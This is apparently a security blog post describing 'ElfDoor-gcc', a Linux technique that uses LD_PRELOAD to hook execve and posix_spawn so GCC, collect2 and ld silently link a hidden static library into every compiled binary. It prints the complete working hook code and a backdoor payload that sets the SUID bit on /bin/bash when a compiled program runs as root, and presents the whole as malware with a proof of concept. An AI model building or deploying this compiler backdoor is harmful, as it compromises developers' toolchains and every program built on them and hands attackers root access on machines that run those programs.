---
title: ElfDoor-gcc
image: https://i.imgur.com/xeSd64L.png
description: Hijacking GCC via LD_PRELOAD.
categories: [Malware]
tags: [Rootkit]
author: 0xMatheuZ
---

Hijacking GCC with LD_PRELOAD
===========================================================================

![imgur](https://i.imgur.com/MmPbrjL.png)



Introduction
----------

If you've ever wondered how it's possible to inject malicious code into binaries **without touching the source code**, and using only standard Linux tools, this article is for you. We'll explore a very cool technique that intercepts the compilation process with LD\_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during **linking**.

In the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.

This is a simple project, with simple ideas and mechanisms, and it can certainly be improved.

ElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc

Understanding the Compilation Process with GCC
-------------------------------------------

Before attacking the compilation process, it's essential to understand how it works

GCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:

```gcc main.c -o main```


This command has a sequence of steps:

1.  **Preprocessing (cpp)**
    
    *   Expands macros, includes header files, and removes comments.
        
    *   Generates a .i file containing the "expanded" source code.
        
2.  **Compilation (cc1)**
    
    *   Converts the .i code into assembly.
        
    *   Performs syntax and semantic checks, along with optimizations.
        
3.  **Assembly (as)**
    
    *   Translates the assembly code into an object file (.o).
        
4.  **Linkagem (collect2 → ld)**
    
    *   Combines object files, resolves symbols, and produces the final binary.
        
    *   gcc invokes collect2, which in turn calls ld, the actual linker.
        

This final stage **linking**, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library

Attack Chain
-------------------

The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.

Our project will consist of:

*   **main.c**: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.
    
*   **b.a**: The library containing the malicious code we want to embed in the final binary
    
*   **Install.sh**: Compiles and loads our malicious LD_PRELOAD.

*   **hello.c**: A simple program that just prints "Hello," but after compiling and executing, it will run our malicious code.
    

ElfDoor Hooks
-----------------------------

The `main.c` file is responsible for hooking process execution functions, such as `execve` and `posix_spawn`, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a "hidden" payload without the developer noticing.

The structure starts with the inclusion of the essential libraries:

```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <spawn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

extern char **environ;
```

The use of `_GNU_SOURCE` is essential to enable GNU libc specific extensions, such as the interception of `execve` and `posix_spawn`. Including `<dlfcn.h>` allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.

Next, we have auxiliary functions responsible for determining if the running binary is relevant. For example, `is_gcc` detects whether the binary being executed is the `GCC`, `cc`, or `clang` compiler:

```c
int is_gcc(const char *path) {
    const char *progname = strrchr(path, '/');
    progname = progname ? progname + 1 : path;
    return strcmp(progname, "gcc") == 0 || strcmp(progname, "cc") == 0 || strcmp(progname, "clang") == 0;
}
```

The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify `collect2` and `ld` in the `is_collect2` and `is_linker` functions.

Then, the `should_inject` function determines whether the injection should occur, based on the compiler arguments:

```c
int should_inject(char *const argv[]) {
    for (int i = 0; argv[i]; ++i) {
        if (strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "-E") == 0 || strcmp(argv[i], "-S") == 0)
            return 0;
    }
    return 1;
}
```

These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.

The most important function is `inject_args`, which constructs a new argument list by inserting the static library:

```c
char **inject_args(const char *bin_path, char *const argv[], int extra) {
    int argc;
    for (argc = 0; argv[argc]; ++argc);

    const char *lib_path = "/dev/shm/b.a";

    for (int i = 0; i < argc; ++i) {
        if (argv[i] && strstr(argv[i], "b.a") != NULL) {
            return NULL;
        }
    }

    const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1));
    if (!new_argv) return NULL;

    int i = 0, j = 0;
    for (; i < argc; ++i)
        new_argv[j++] = argv[i];

    const char *arg1, *arg2, *arg3;
    if (is_gcc(bin_path)) {
        arg1 = "-Wl,--whole-archive";
        arg2 = lib_path;
        arg3 = "-Wl,--no-whole-archive";
    } else {
        arg1 = "--whole-archive";
        arg2 = lib_path;
        arg3 = "--no-whole-archive";
    }

    new_argv[j++] = arg1;
    new_argv[j++] = arg2;
    new_argv[j++] = arg3;
    new_argv[j] = NULL;

    return (char **)new_argv;
}
```

The `inject_args` function modifies a program's argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.


The hooking of `execve` happens as follows:

```c
int execve(const char *pathname, char *const argv[], char *const envp[]) {
    static int (*real_execve)(const char *, char *const [], char *const []) = NULL;
    if (!real_execve) real_execve = dlsym(RTLD_NEXT, "execve");

    if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) && should_inject(argv)) {
        char **new_argv = inject_args(pathname, argv, 3);
        if (new_argv) {
            int result = real_execve(pathname, new_argv, envp);
            free(new_argv);
            return result;
        }
    }

    return real_execve(pathname, argv, envp);
}
```

When the process attempts to execute `gcc`, `ld`, or similar, the `execve` hook intercepts the call. It calls the `inject_args` function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original `execve` function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.

Finally, the `posix_spawn` function is handled with identical logic:

```c
int posix_spawn(pid_t *pid, const char *path,
                const posix_spawn_file_actions_t *file_actions,
                const posix_spawnattr_t *attrp,
                char *const argv[], char *const envp[]) {
    static int (*real_posix_spawn)(pid_t *, const char *,
                                   const posix_spawn_file_actions_t *,
                                   const posix_spawnattr_t *,
                                   char *const [], char *const []) = NULL;
    if (!real_posix_spawn)
        real_posix_spawn = dlsym(RTLD_NEXT, "posix_spawn");

    if ((is_gcc(path) || is_collect2(path) || is_linker(path)) && should_inject(argv)) {
        char **new_argv = inject_args(path, argv, 3);
        if (new_argv) {
            int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp);
            free(new_argv);
            return result;
        }
    }

    return real_posix_spawn(pid, path, file_actions, attrp, argv, envp);
}
```

This hook ensures that even when `gcc` or `ld` use `posix_spawn` internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.

The entire mechanism is activated when the library compiled with this `main.c` is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.

## Malicious code: b.c

The purpose of the b.c code is to modify the permissions of `/bin/bash` to allow it to be executed with elevated privileges.

```c
#include <unistd.h>
#include <sys/stat.h>

__attribute__((constructor)) 
void backdoor() {
    chmod("/bin/bash", 04755);
}
```

In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the `SUID` on `/bin/bash`.

## POC


![imgur](https://i.imgur.com/ZSM4udM.png)

Conclusion
---------

With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.

The result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.

Please feel free to contact me on [Twitter](https://x.com/MatheuzSecurity) if you have any questions.

[Rootkit Researchers](https://discord.gg/66N5ZQppU7)

